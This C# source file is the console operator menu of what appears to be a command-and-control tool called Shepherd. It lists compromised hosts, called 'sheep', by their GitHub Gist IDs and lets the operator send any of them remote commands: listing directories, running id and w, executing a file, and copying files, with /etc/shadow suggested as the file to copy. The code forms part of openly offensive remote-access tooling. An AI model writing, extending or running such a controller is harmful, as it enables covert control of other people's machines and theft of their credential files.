using ConsoleTables;
using Sharprompt;
using Sharprompt.Fluent;
using Shepherd.Core;

namespace Shepherd.Wizard;

public class Wizard
{
    private readonly ShepherdController _shepherdController;

    public Wizard(ShepherdController shepherdController)
    {
        _shepherdController = shepherdController;
    }

    public async Task MainMenu()
    {
        var mainMenuOption = Prompt.Select<MainMenuOptions>("Main menu", defaultValue: MainMenuOptions.ListSheep);

        switch (mainMenuOption)
        {
            case MainMenuOptions.ListSheep:
                await DisplaySheep();
                break;
            case MainMenuOptions.ControlSheep:
                var key = await SelectSheep();
                await SheepAction(key);
                break;
            case MainMenuOptions.EuthanizeSheep:
                break;
            case MainMenuOptions.Exit:
                Environment.Exit(0);
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }

        await MainMenu();
    }

    private async Task SheepAction(string sheepKey)
    {
        var action = Prompt.Select<SheepActionsOptions>(x =>
            x.WithMessage("What do you want to do? 😈")
        );

        switch (action)
        {
            case SheepActionsOptions.W:
                await _shepherdController.CommandW(sheepKey);
                break;
            case SheepActionsOptions.Ls:
                var lsPath = Prompt.Input<string>("Path 🛣️", placeholder:"/home/Billy/pasture");
                await _shepherdController.CommandLs(sheepKey,lsPath);
                break;
            case SheepActionsOptions.Id:
                await _shepherdController.CommandId(sheepKey);
                break;
            case SheepActionsOptions.Copy:
                var copyPath = Prompt.Input<string>("Path 🛣️", placeholder:"/etc/shadow");
                await _shepherdController.CommandCopy(sheepKey, copyPath);
                break;
            case SheepActionsOptions.Execute:
                var executePath = Prompt.Input<string>("Path 🛣️", placeholder:"/usr/bin/feed");
                await _shepherdController.CommandExecute(sheepKey, executePath);
                break;
            case SheepActionsOptions.Return:
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }
    }

    private async Task<string> SelectSheep()
    {
        var sheep = await _shepherdController.GetSheep();
        var sheepSelectOptions = sheep
            .Select(s => s.Key)
            .ToArray();

        var selectedSheepKey = Prompt.Select<string>(x =>
            x
                .WithItems(sheepSelectOptions)
                .WithMessage("Select 🐑 to control! 🕹️")
        );

        return selectedSheepKey;
    }

    private async Task DisplaySheep()
    {
        var sheep = await _shepherdController.GetSheep();

        Console.WriteLine("Listing active sheep... 🐏");


        ConsoleTable table = new ConsoleTable("Sheep Id 🐑", "Gist Id 🗒️");

        foreach (var s in sheep)
        {
            table.AddRow(s.Key, $"https://gist.github.com/{s.Value}");
        }

        table.Write();
        Console.WriteLine();
    }
}